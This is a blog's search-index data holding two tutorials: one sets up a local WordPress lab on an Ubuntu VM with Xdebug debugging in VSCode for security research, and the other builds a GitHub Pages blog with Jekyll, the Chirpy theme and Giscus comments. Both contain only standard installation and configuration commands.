blogging, then evolved into a platform for building websites, online stores, forums, landing pages, etc. Today, more than 40% of websites worldwide run on WordPress. There are two versions of WordPress: WordPress.com Hosting service provided by Automattic You just register an account, no installation needed Limited customization; advanced features require payment WordPress.org Open source, you download and install it on your own hosting/server Fully customizable: install plugins, themes, write code, and build any type of website ","date":"2025-08-21","objectID":"/2025-08-21-wordpress-local-and-debugging/:0:0","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/2025-08-21-wordpress-local-and-debugging/"},{"categories":["Technology","Web"],"content":"Ecosystem Core: the main CMS Plugins: add-on software that extends WordPress functionality with new features Themes: add-on software that defines the visual appearance and layout of a WordPress site ","date":"2025-08-21","objectID":"/2025-08-21-wordpress-local-and-debugging/:1:0","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/2025-08-21-wordpress-local-and-debugging/"},{"categories":["Technology","Web"],"content":"Why WordPress Hacking? State of WordPress Security in 2024 ","date":"2025-08-21","objectID":"/2025-08-21-wordpress-local-and-debugging/:2:0","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/2025-08-21-wordpress-local-and-debugging/"},{"categories":["Technology","Web"],"content":"Most Popular Currently, more than 40% of websites worldwide run on WordPress This means hackers only need to find one common vulnerability =\u003e they can exploit millions of sites at once Similar to the saying: ‚Äúfish where the fish are‚Äù ","date":"2025-08-21","objectID":"/2025-08-21-wordpress-local-and-debugging/:2:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/2025-08-21-wordpress-local-and-debugging/"},{"categories":["Technology","Web"],"content":"Plugins and Themes WordPress Core has been reviewed for a long time by thousands of developers and researchers, making it very difficult for attackers to compromise directly. However, there are tens of thousands of plugins and themes from various sources with inconsistent quality. Many plugins have poor security coding and are outdated. Hackers just need to scan for outdated versions and exploit them. ","date":"2025-08-21","objectID":"/2025-08-21-wordpress-local-and-debugging/:2:2","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/2025-08-21-wordpress-local-and-debugging/"},{"categories":["Technology","Web"],"content":"Setup WordPress for Hacking There are many ways to set up WordPress; searching Google will provide plenty of guides. Here I will set it up on an Ubuntu (22.04) virtual machine: Does not affect real machine services WordPress is relatively lightweight and works well on a VM ","date":"2025-08-21","objectID":"/2025-08-21-wordpress-local-and-debugging/:3:0","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/2025-08-21-wordpress-local-and-debugging/"},{"categories":["Technology","Web"],"content":"Install and Configure WordPress Install Dependencies Install the full stack required to run WordPress (web server + database + PHP + important extensions): sudo apt install -y apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Download and install WordPress source into the web directory: # Create folder to store site source code sudo mkdir -p /srv/www # Change ownership to www-data (default user for Apache/Nginx) sudo chown www-data: /srv/www # Download the latest WordPress package and extract it into /srv/www curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www Download a specific version: curl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Installing from wordpress.org is the most reliable and safest approach: Ubuntu has a wordpress package in its repository, but it is often outdated compared to the official release. The WordPress community only supports installations from the official source. Configure Apache for WordPress Create \u0026 edit /etc/apache2/sites-available/wordpress.conf: sudo nano /etc/apache2/sites-available/wordpress.conf Paste the following content in: \u003cVirtualHost *:80\u003e DocumentRoot /srv/www/wordpress \u003cDirectory /srv/www/wordpress\u003e Options FollowSymLinks AllowOverride Limit Options FileInfo DirectoryIndex index.php Require all granted \u003c/Directory\u003e \u003cDirectory /srv/www/wordpress/wp-content\u003e Options FollowSymLinks Require all granted \u003c/Directory\u003e \u003c/VirtualHost\u003e Enable the site: sudo a2ensite wordpress Enable rewrite module: sudo a2enmod rewrite (Optional) Disable default site: sudo a2dissite 000-default Reload Apache: sudo service apache2 reload Configure Database sudo mysql -u root CREATE DATABASE wordpress; CREATE USER wordpress@localhost IDENTIFIED BY '\u003cyour-password\u003e'; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; FLUSH PRIVILEGES; quit Restart MySQL: sudo service mysql start Configure WordPress to Connect to the Database Copy config file: sudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php Edit database info: sudo -u www-data sed -i 's/database_name_here/wordpress/' /srv/www/wordpress/wp-config.php sudo -u www-data sed -i 's/username_here/wordpress/' /srv/www/wordpress/wp-config.php sudo -u www-data sed -i 's/password_here/\u003cyour-password\u003e/' /srv/www/wordpress/wp-config.php Add secret keys and salts from: https://api.wordpress.org/secret-key/1.1/salt/ sudo nano /srv/www/wordpress/wp-config.php Configure WordPress Visit http://localhost and set site title, username, password, and admin email. Configure WordPress ","date":"2025-08-21","objectID":"/2025-08-21-wordpress-local-and-debugging/:3:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/2025-08-21-wordpress-local-and-debugging/"},{"categories":["Technology","Web"],"content":"Setup Debug on VSCode Add PHP Debug Extension on VSCode Go to Extensions (Ctrl+Shift+X) ‚Üí search PHP Debug (by Felix Becker) ‚Üí Install. Install Xdebug on Ubuntu sudo apt install php-xdebug -y Check installation: php -v Configure Xdebug sudo nano /etc/php/\u003cversion\u003e/apache2/php.ini Append: zend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Restart Apache: sudo systemctl restart apache2 Configure VSCode launch.json Open WordPress folder in VSCode: code /srv/www/wordpress Create .vscode/launch.json: { \"version\": \"0.2.0\", \"configurations\": [ { \"name\": \"Listen for Xdebug\", \"type\": \"php\", \"request\": \"launch\", \"port\": 9003, \"pathMappings\": { \"/srv/www/wordpress\": \"${workspaceFolder}\" } } ] } ","date":"2025-08-21","objectID":"/2025-08-21-wordpress-local-and-debugging/:3:2","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/2025-08-21-wordpress-local-and-debugging/"},{"categories":["Technology","Web"],"content":"Extend ","date":"2025-08-21","objectID":"/2025-08-21-wordpress-local-and-debugging/:4:0","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/2025-08-21-wordpress-local-and-debugging/"},{"categories":["Technology","Web"],"content":"Required Version Each WordPress version usually requires a specific PHP version. Always check compatibility. ","date":"2025-08-21","objectID":"/2025-08-21-wordpress-local-and-debugging/:4:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/2025-08-21-wordpress-local-and-debugging/"},{"categories":["Technology","Web"],"content":"WordPress Auto Update Since WordPress 3.7 (2013), WordPress supports automatic background updates for: Security releases Maintenance releases (Major versions require explicit opt-in) To disable auto updates, add to wp-config.php: define( 'WP_AUTO_UPDATE_CORE', false ); ","date":"2025-08-21","objectID":"/2025-08-21-wordpress-local-and-debugging/:4:2","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/2025-08-21-wordpress-local-and-debugging/"},{"categories":["Technology","Web"],"content":"Increase Plugin Upload Size Paste below content into php.ini file. upload_max_filesize = 64M post_max_size = 64M memory_limit = 128M max_execution_time = 300 max_input_time = 300 ","date":"2025-08-21","objectID":"/2025-08-21-wordpress-local-and-debugging/:4:3","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/2025-08-21-wordpress-local-and-debugging/"},{"categories":["Web"],"content":"How to create your personal blog using Github Pages with a \"comment\" feature","date":"2025-08-19","objectID":"/2025-08-19-github-pages-with-jekyll-themes-and-giscus/","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/2025-08-19-github-pages-with-jekyll-themes-and-giscus/"},{"categories":["Web"],"content":"When starting a personal blog, there are three tools you should know: GitHub Pages, Jekyll, and Giscus. Github Pages: A free service from GitHub that allows you to deploy static websites directly from a repository. Just push your code to GitHub, and your blog will automatically go live on the Internet without needing your own server. Jekyll: A static site generator integrated with GitHub Pages. Jekyll makes it easy to create blogs from Markdown files, organize content using templates, and apply ready-to-use themes. Giscus: A modern comment system based on GitHub Discussions. Instead of using external services like Disqus, you can leverage GitHub to manage comments, keeping it lightweight and developer-friendly. ","date":"2025-08-19","objectID":"/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:0:0","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/2025-08-19-github-pages-with-jekyll-themes-and-giscus/"},{"categories":["Web"],"content":"Requirements A Github account Basic knowledge of Markdown ","date":"2025-08-19","objectID":"/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:1:0","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/2025-08-19-github-pages-with-jekyll-themes-and-giscus/"},{"categories":["Web"],"content":"Creating a Site Repository Here, I use the Chirpy theme, a popular theme for GitHub Pages optimized for personal or technical blogging. Steps: Log in to Github and go to the starter. Instead of forking, click Use this template and select Create a new repository to automatically create a Site Repository. Name the new repository \u003cusername\u003e.github.io, replacing \u003cusername\u003e with your GitHub username. ","date":"2025-08-19","objectID":"/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:2:0","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/2025-08-19-github-pages-with-jekyll-themes-and-giscus/"},{"categories":["Web"],"content":"Setting up the Environment There are two main reasons to set up a local development environment for your blog: After pushing code to the repository, GitHub Actions takes time to run before building and rendering the site on GitHub Pages. By developing directly on your local machine, you can see changes instantly‚Äîfaster and more convenient. ","date":"2025-08-19","objectID":"/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:3:0","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/2025-08-19-github-pages-with-jekyll-themes-and-giscus/"},{"categories":["Web"],"content":"Using Dev Containers (Recommended for Windows) Dev Containers provide an isolated environment via Docker, preventing conflicts with your system and ensuring all dependencies are managed inside the container. Steps: Install Docker: On Windows/macOS: install Docker Desktop. On Linux: install Docker Engine. Install VS Code and the Dev Containers extension. Clone the repository: If using Docker Desktop: open VS Code and clone the repo in a container volume. If using Docker Engine: clone the repo locally, then open it in a container in VS Code. Wait for the Dev Containers setup process to complete. ","date":"2025-08-19","objectID":"/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:3:1","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/2025-08-19-github-pages-with-jekyll-themes-and-giscus/"},{"categories":["Web"],"content":"Setting up Natively (Recommended for Unix-like OS) For Unix-like systems (Linux, macOS), you can set up the environment directly (natively) for better performance. Dev Containers are still available as an alternative. Steps: Follow the Jekyll installation guide and ensure Git is installed. Clone the repository locally. If you forked the theme, install Node.js and run bash tools/init.sh in the root folder to initialize the repo. Run the following commands in the root folder to install gems into ./vendor/bundle/ within the project‚Äîno need for sudo and no changes to /var/lib/gems.. bundle config set --local path 'vendor/bundle' bundle install ","date":"2025-08-19","objectID":"/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:3:2","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/2025-08-19-github-pages-with-jekyll-themes-and-giscus/"},{"categories":["Web"],"content":"Usage ","date":"2025-08-19","objectID":"/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:4:0","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/2025-08-19-github-pages-with-jekyll-themes-and-giscus/"},{"categories":["Web"],"content":"Start the Jekyll Server To run the site locally, use: bundle exec jekyll s ","date":"2025-08-19","objectID":"/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:4:1","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/2025-08-19-github-pages-with-jekyll-themes-and-giscus/"},{"categories":["Web"],"content":"Configuration Some variables to configure in _config.yml include: lang: set the website language url: your website URL title: main title shown under the avatar tagline: subtitle or site description avatar: supports local and CORS resources, including gif ","date":"2025-08-19","objectID":"/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:4:2","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/2025-08-19-github-pages-with-jekyll-themes-and-giscus/"},{"categories":["Web"],"content":"Comment feature via Giscus We‚Äôll use Giscus as the comment system. Other free alternatives include Disqus and Utterances. Steps: Install giscus on GitHub. In your repository Settings, go to General and enable Discussions so giscus can store comments. Enter the repository name \u003cusername\u003e/\u003cusername\u003e.github.io. A green checkmark will appear when requirements are met. Choose the discussion category and topic for your site. Configure giscus in _config.yml: provider: set to giscus giscus: map the variables you set on giscus to the giscus section ","date":"2025-08-19","objectID":"/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:4:3","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/2025-08-19-github-pages-with-jekyll-themes-and-giscus/"},{"categories":["Web"],"content":"Customize the Favicon Create a custom favicon for your website instead of using the theme‚Äôs default. Steps: Go to Favicon Generator. Click Browse to select your favicon file, then Create Favicon. Click Download the generated favicon to get the files. Extract the downloaded file and delete these two: browserconfig.xml site.webmanifest Copy the remaining files into assets/img/favicons (create the folder if it doesn‚Äôt exist). ","date":"2025-08-19","objectID":"/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:4:4","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/2025-08-19-github-pages-with-jekyll-themes-and-giscus/"},{"categories":["Web"],"content":"Extends ","date":"2025-08-19","objectID":"/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:5:0","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/2025-08-19-github-pages-with-jekyll-themes-and-giscus/"},{"categories":["Web"],"content":"Remove meta tag in Footer You can remove the line Using the Chirpy theme for Jekyll. with these steps: Create a file at _data/locales/en.yml. Copy the contents of en.yml and paste into the new file. Change the value of meta to \"\". ","date":"2025-08-19","objectID":"/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:5:1","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/2025-08-19-github-pages-with-jekyll-themes-and-giscus/"},{"categories":["Web"],"content":"Write a post Check the rules for writing blog posts with this theme and use Live Preview to preview your content. ","date":"2025-08-19","objectID":"/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:5:2","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/2025-08-19-github-pages-with-jekyll-themes-and-giscus/"}]